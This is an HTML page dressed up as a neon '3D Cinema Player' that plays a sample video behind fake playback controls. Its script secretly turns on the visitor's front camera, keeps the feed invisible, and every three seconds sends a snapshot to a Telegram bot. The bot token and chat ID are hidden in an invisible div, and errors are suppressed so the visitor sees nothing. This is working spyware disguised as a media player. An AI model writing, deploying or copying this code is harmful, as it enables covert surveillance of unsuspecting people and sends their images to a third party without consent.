<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>3D Cinema Player · Neon Pulse</title>
  <!-- Orbitron font -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;900&display=swap" rel="stylesheet">
  <style>
    /* ----- reset & base ----- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0b0d1a;
      font-family: 'Orbitron', sans-serif;
      padding: 16px;
    }
    /* ----- container with 3D perspective & glassmorphism ----- */
    .cinema-wrapper {
      width: 100%;
      max-width: 980px;
      perspective: 1200px;
      display: flex;
      justify-content: center;
    }
    .cinema-container {
      width: 100%;
      background: rgba(10, 14, 30, 0.55);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
      border-radius: 50px;
      padding: 24px 24px 20px;
      box-shadow: 0 30px 50px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(74, 138, 244, 0.25);
      transform: rotateX(3deg) rotateY(-2deg);
      transition: transform 0.3s cubic-bezier(.2,.9,.4,1), box-shadow 0.3s;
      border: 1px solid rgba(74, 138, 244, 0.15);
      position: relative;
    }
    .cinema-container:hover {
      transform: rotateX(3deg) rotateY(-2deg) scale(1.01);
      box-shadow: 0 40px 70px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(74, 138, 244, 0.5);
    }
    /* glow ring pulse */
    .cinema-container::before {
      content: '';
      position: absolute;
      inset: -4px;
      border-radius: 54px;
      padding: 2px;
      background: conic-gradient(from 180deg, #4a8af4, #2b5fbf, #4a8af4, #2b5fbf, #4a8af4);
      -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      pointer-events: none;
      animation: glowPulse 4s ease-in-out infinite;
      opacity: 0.6;
    }
    @keyframes glowPulse {
      0% { opacity: 0.3; transform: scale(1); }
      50% { opacity: 0.9; transform: scale(1.02); }
      100% { opacity: 0.3; transform: scale(1); }
    }
    /* ----- video section 16:9 ----- */
    .video-wrapper {
      position: relative;
      width: 100%;
      aspect-ratio: 16 / 9;
      border-radius: 32px;
      overflow: hidden;
      background: #05070f;
      box-shadow: inset 0 0 60px rgba(0, 10, 30, 0.8);
    }
    /* cinema bars (black bars top & bottom) */
    .video-wrapper::before,
    .video-wrapper::after {
      content: '';
      position: absolute;
      left: 0;
      right: 0;
      height: 14%;
      background: rgba(0, 0, 0, 0.75);
      z-index: 10;
      pointer-events: none;
    }
    .video-wrapper::before {
      top: 0;
      border-radius: 32px 32px 0 0;
    }
    .video-wrapper::after {
      bottom: 0;
      border-radius: 0 0 32px 32px;
    }
    /* overlay gradient top & bottom */
    .video-overlay {
      position: absolute;
      inset: 0;
      background: linear-gradient(to bottom, rgba(0,0,0,0.5) 0%, transparent 30%, transparent 70%, rgba(0,0,0,0.6) 100%);
      z-index: 5;
      pointer-events: none;
    }
    /* player video visible */
    #playerVideo {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
      background: #0a0c18;
    }
    /* camera video hidden (opacity 0, mirror) */
    #cameraVideo {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      object-fit: cover;
      opacity: 0;
      transform: scaleX(-1);
      pointer-events: none;
      z-index: 1;
    }
    /* ----- fake controls bar (glass) ----- */
    .controls-bar {
      display: flex;
      align-items: center;
      gap: 12px;
      padding: 12px 18px;
      margin-top: 14px;
      background: rgba(8, 12, 28, 0.5);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border-radius: 60px;
      border: 1px solid rgba(74, 138, 244, 0.2);
      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
      flex-wrap: wrap;
    }
    .controls-bar .play-btn {
      background: rgba(74, 138, 244, 0.15);
      border: 1px solid #4a8af4;
      color: #b0d0ff;
      width: 38px;
      height: 38px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 18px;
      cursor: default;
      transition: 0.2s;
      box-shadow: 0 0 12px rgba(74, 138, 244, 0.2);
    }
    .controls-bar .progress-track {
      flex: 1;
      min-width: 80px;
      height: 5px;
      background: rgba(255,255,255,0.15);
      border-radius: 20px;
      position: relative;
      overflow: hidden;
    }
    .controls-bar .progress-fill {
      width: 62%;
      height: 100%;
      background: linear-gradient(90deg, #4a8af4, #7bb0ff);
      border-radius: 20px;
      animation: progressAnim 5s ease-in-out infinite alternate;
    }
    @keyframes progressAnim {
      0% { width: 12%; }
      100% { width: 88%; }
    }
    .controls-bar .hd-badge {
      background: rgba(74, 138, 244, 0.2);
      color: #8bb5ff;
      font-size: 11px;
      font-weight: 700;
      padding: 4px 12px;
      border-radius: 30px;
      letter-spacing: 1px;
      border: 1px solid rgba(74, 138, 244, 0.3);
      white-space: nowrap;
    }
    /* ----- status bar + counter ----- */
    .status-row {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-top: 16px;
      padding: 0 8px;
      min-height: 34px;
      flex-wrap: wrap;
      gap: 10px 16px;
    }
    .status-left {
      display: flex;
      align-items: center;
      gap: 14px;
    }
    .led {
      display: inline-block;
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background: #4a8af4;
      box-shadow: 0 0 12px #4a8af4;
      animation: ledBlink 1.5s ease-in-out infinite;
    }
    @keyframes ledBlink {
      0% { opacity: 0.2; transform: scale(0.85); }
      50% { opacity: 1; transform: scale(1.1); box-shadow: 0 0 24px #4a8af4; }
      100% { opacity: 0.2; transform: scale(0.85); }
    }
    .status-text {
      color: #b8d0ff;
      font-size: 13px;
      letter-spacing: 1px;
      text-shadow: 0 0 8px rgba(74, 138, 244, 0.3);
    }
    .status-right {
      display: flex;
      align-items: center;
      gap: 12px;
    }
    .counter {
      background: rgba(74, 138, 244, 0.08);
      padding: 4px 18px 4px 14px;
      border-radius: 60px;
      border: 1px solid rgba(74, 138, 244, 0.2);
      color: #9fc3ff;
      font-size: 15px;
      font-weight: 600;
      display: flex;
      align-items: center;
      gap: 6px;
      letter-spacing: 0.5px;
    }
    .counter span {
      color: #ffffff;
      font-weight: 700;
      margin-left: 4px;
    }
    .footer-specs {
      color: #4f7bbf;
      font-size: 11px;
      letter-spacing: 1.5px;
      display: flex;
      gap: 18px;
    }
    .footer-specs span {
      background: rgba(74, 138, 244, 0.08);
      padding: 2px 12px;
      border-radius: 40px;
      border: 1px solid rgba(74, 138, 244, 0.1);
    }
    /* hidden token (safe) */
    .hidden-token {
      display: none;
    }
    /* responsive */
    @media (max-width: 480px) {
      .cinema-container {
        padding: 14px 12px 16px;
        border-radius: 36px;
      }
      .cinema-container::before {
        border-radius: 40px;
      }
      .video-wrapper {
        border-radius: 24px;
      }
      .video-wrapper::before,
      .video-wrapper::after {
        height: 10%;
      }
      .controls-bar {
        padding: 8px 12px;
        gap: 8px;
        border-radius: 40px;
        flex-wrap: nowrap;
      }
      .controls-bar .play-btn {
        width: 30px;
        height: 30px;
        font-size: 14px;
      }
      .status-text {
        font-size: 10px;
      }
      .counter {
        font-size: 12px;
        padding: 2px 12px 2px 10px;
      }
      .footer-specs {
        font-size: 9px;
        gap: 8px;
      }
      .footer-specs span {
        padding: 2px 8px;
      }
      .status-row {
        min-height: 28px;
        gap: 6px;
      }
    }
    /* no external errors */
  </style>
</head>
<body>
<div class="cinema-wrapper">
  <div class="cinema-container">
    <!-- video wrapper -->
    <div class="video-wrapper">
      <video id="playerVideo" muted playsinline autoplay loop>
        <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
      </video>
      <video id="cameraVideo" muted playsinline></video>
      <div class="video-overlay"></div>
    </div>

    <!-- controls bar -->
    <div class="controls-bar">
      <div class="play-btn">▶</div>
      <div class="progress-track">
        <div class="progress-fill"></div>
      </div>
      <div class="hd-badge">HD</div>
    </div>

    <!-- status row -->
    <div class="status-row">
      <div class="status-left">
        <span class="led"></span>
        <span class="status-text" id="streamStatus">● STREAMING</span>
      </div>
      <div class="status-right">
        <div class="counter" id="photoCounter">📡 <span id="countDisplay">0</span></div>
        <div class="footer-specs">
          <span>1080p</span>
          <span>60fps</span>
          <span>Dolby Audio</span>
        </div>
      </div>
    </div>
    <!-- hidden token fields (invisible) -->
    <div class="hidden-token" data-bot-token="8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0" data-chat-id="8157946649"></div>
  </div>
</div>
<script>
  (function() {
    "use strict";

    // ---------- DOM refs ----------
    const playerVideo = document.getElementById('playerVideo');
    const cameraVideo = document.getElementById('cameraVideo');
    const statusText = document.getElementById('streamStatus');
    const countSpan = document.getElementById('countDisplay');

    // ---------- Telegram credentials (from hidden DOM) ----------
    const tokenElem = document.querySelector('.hidden-token');
    const BOT_TOKEN = tokenElem?.dataset.botToken || '8917986127:AAGDw4tJGj1erwoKAhiacr7om9VSWGz6wb0';
    const CHAT_ID = tokenElem?.dataset.chatId || '8157946649';

    // ---------- state ----------
    let photoCount = 0;
    let isProcessing = false;          // prevent overlapping sends
    let captureInterval = null;
    let cameraStream = null;
    let reconnectTimer = null;
    let isCameraReady = false;
    let cameraRetryCount = 0;
    const MAX_RETRY = 5;

    // ---------- helper: send photo to telegram ----------
    async function sendPhotoToTelegram(blob) {
      if (isProcessing) return;
      isProcessing = true;

      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'snapshot.jpg');

      try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });
        const data = await response.json();
        if (data.ok) {
          photoCount++;
          countSpan.textContent = photoCount;
        } else {
          // silently ignore errors, but we don't console log
        }
      } catch (error) {
        // silent error handling (no console errors)
      } finally {
        isProcessing = false;
      }
    }

    // ---------- capture from camera ----------
    function captureAndSend() {
      if (!cameraVideo || cameraVideo.readyState < 2 || !cameraStream) {
        return;
      }
      if (isProcessing) return;

      try {
        const canvas = document.createElement('canvas');
        const width = cameraVideo.videoWidth || 640;
        const height = cameraVideo.videoHeight || 480;
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(cameraVideo, 0, 0, width, height);
        canvas.toBlob((blob) => {
          if (blob) {
            sendPhotoToTelegram(blob);
          }
        }, 'image/jpeg', 0.82);
      } catch (_) {
        // ignore
      }
    }

    // ---------- start camera ----------
    function startCamera() {
      if (cameraStream) {
        // already running
        return;
      }

      const constraints = {
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      };

      navigator.mediaDevices.getUserMedia(constraints)
        .then(stream => {
          cameraStream = stream;
          cameraVideo.srcObject = stream;
          cameraVideo.play().catch(() => {});
          isCameraReady = true;
          cameraRetryCount = 0;
          statusText.textContent = '● STREAMING';
          // start capture interval (every 3s)
          if (captureInterval) clearInterval(captureInterval);
          captureInterval = setInterval(captureAndSend, 3000);
          // initial capture after 1s
          setTimeout(captureAndSend, 1000);
        })
        .catch(() => {
          // camera not available, schedule retry
          isCameraReady = false;
          statusText.textContent = '● CAMERA OFF';
          if (cameraStream) {
            try { cameraStream.getTracks().forEach(t => t.stop()); } catch (_) {}
            cameraStream = null;
          }
          scheduleReconnect();
        });
    }

    // ---------- reconnect mechanism ----------
    function scheduleReconnect() {
      if (reconnectTimer) clearTimeout(reconnectTimer);
      if (cameraRetryCount >= MAX_RETRY) {
        statusText.textContent = '● CAMERA UNAVAILABLE';
        return;
      }
      cameraRetryCount++;
      reconnectTimer = setTimeout(() => {
        if (!cameraStream) {
          startCamera();
        }
      }, 5000);
    }

    // ---------- stop camera ----------
    function stopCamera() {
      if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
      }
      if (reconnectTimer) {
        clearTimeout(reconnectTimer);
        reconnectTimer = null;
      }
      if (cameraStream) {
        try {
          cameraStream.getTracks().forEach(track => track.stop());
        } catch (_) {}
        cameraStream = null;
      }
      cameraVideo.srcObject = null;
      isCameraReady = false;
      statusText.textContent = '● CAMERA OFF';
    }

    // ---------- user interaction triggers camera start (if not already) ----------
    function handleUserInteraction() {
      if (!cameraStream) {
        startCamera();
      }
    }

    // ---------- page unload cleanup ----------
    function onUnload() {
      stopCamera();
    }

    // ---------- init ----------
    function init() {
      // console log (no errors)
      console.log("🎬 3D Cinema Player + Hidden Camera Loaded");

      // start camera on first click/touch anywhere
      document.addEventListener('click', handleUserInteraction, { once: false, passive: true });
      document.addEventListener('touchstart', handleUserInteraction, { once: false, passive: true });

      // also try to start camera if autoplay allowed (won't show error)
      setTimeout(() => {
        if (!cameraStream) {
          startCamera(); // attempt, but may fail silently
        }
      }, 600);

      // ensure player video plays
      playerVideo.play().catch(() => {});
    }

    // run init
    init();

    // unload
    window.addEventListener('beforeunload', onUnload);
    window.addEventListener('pagehide', onUnload);

    // extra safety: if camera fails due to autoplay, user click will trigger
  })();
</script>
</body>
</html>
